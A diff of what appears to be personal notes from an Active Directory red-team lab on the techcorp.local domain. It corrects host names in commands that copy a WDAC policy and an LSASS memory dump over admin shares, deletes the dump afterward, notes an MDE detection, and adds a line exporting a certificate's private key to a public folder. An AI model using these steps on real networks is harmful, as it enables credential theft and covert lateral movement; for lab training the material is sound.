@@ -1,4 +1,4 @@
-
+ 
 Task 
 • Enumerate gMSAs in the us.techcorp.local domain. 
 • Enumerate the principals that can read passwords from any gMSAs. 
@@ -108,11 +108,11 @@ winrs -r:us-jump7 "powershell Get-CimInstance -ClassName Win32_DeviceGuard -Name
 We can now attempt to copy and parse the WDAC config deployed on us-jump to find suitable bypasses and loopholes in the policy
 
 ```
-dir \\usjump7.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity
+dir \\us-jump7.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity
 ```
 
 ```
-copy \\usjumpX.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity\DG.bin.p7 C:\AD\Tools
+copy \\us-jump7.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity\DG.bin.p7 C:\AD\Tools
 ```
 
 
@@ -224,7 +224,7 @@ copy \\us-jump7.US.TECHCORP.LOCAL\c$\users\jumpone$\Downloads\nano.dmp C:\AD\Too
 ![[Pasted image 20250318135637.png]]
 
 ```
-del \\us-jump X.US.TECHCORP.LOCAL\c$\users\jumpone$\Downloads\*
+del \\us-jump7.US.TECHCORP.LOCAL\c$\users\jumpone$\Downloads\*
 ```
 
 ![[Pasted image 20250318135747.png]]
@@ -298,3 +298,6 @@ tasklist /FI "IMAGENAME eq lsass.exe"
 
 Note that the above command fails and will result in a detection in MDE.
 
+```
+ls cert:\LocalMachine\My\7700000022d1a7e4e1f8d0fd53000000000022 | ExportPfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertToSecureString -String 'SecretPass@123' -Force -AsPlainText)
+```
